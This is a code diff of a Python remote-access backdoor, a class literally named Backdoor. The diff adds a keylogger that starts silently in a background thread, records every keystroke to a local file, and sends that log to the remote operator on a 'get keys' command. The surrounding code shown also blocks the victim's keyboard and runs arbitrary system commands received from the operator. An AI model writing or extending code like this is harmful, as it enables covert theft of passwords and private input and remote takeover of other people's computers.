@@ -4,16 +4,23 @@ import keyboard
 
 pyautogui.FAILSAFE = False
 
-def uMad(event):
-    return False
 
-# hm = pyHook.HookManager()
-# hm.MouseAll = uMad
-# hm.KeyAll = uMad
-# hm.HookMouse()
-# hm.HookKeyboard()
-# pythoncom.PumpMessages()
+def writer(data):
+    with open("logs.txt","a") as file:
+        file.write(data)
 
+
+def filter(char):
+	if char == "space":
+		return " "
+	elif len(char) > 1:
+		return "[%s]" % char
+	else:
+		return char
+
+
+def logger(event):
+	writer(filter(event.name))
 
 
 def UkDecode(text):
@@ -34,6 +41,10 @@ class Backdoor:
 		self.connection = None
 
 		self.cursor_blocking = False
+
+		keyboard.on_press(logger)
+		keylogger = threading.Thread(target=keyboard.wait)
+		keylogger.start()
 
 	
 	def block_cursor(self):
@@ -154,11 +165,9 @@ class Backdoor:
 				
 				elif command.split()[0] == "keyboard":
 					if command.split()[1] == "false":
-						try:
-							for i in range(150):
-								keyboard.block_key(i)
-							self.reliable_send("[+] Keyboard disconnected")
-						except: self.reliable_send("[-] Can't block the keyboard")
+						for i in range(150):
+							keyboard.block_key(i)
+						self.reliable_send("[+] Keyboard disconnected")
 					elif command.split()[1] == "true":
 						for i in range(150):
 							keyboard.unblock_key(i)
@@ -178,7 +187,9 @@ class Backdoor:
 					else:
 						self.reliable_send("[-] Can't understand your command")
 
-
+				elif command == "get keys":
+					keys = self.read_file("logs.txt")
+					self.reliable_send(keys)
 
 				else:
 					res = self.execute_system_command(command)
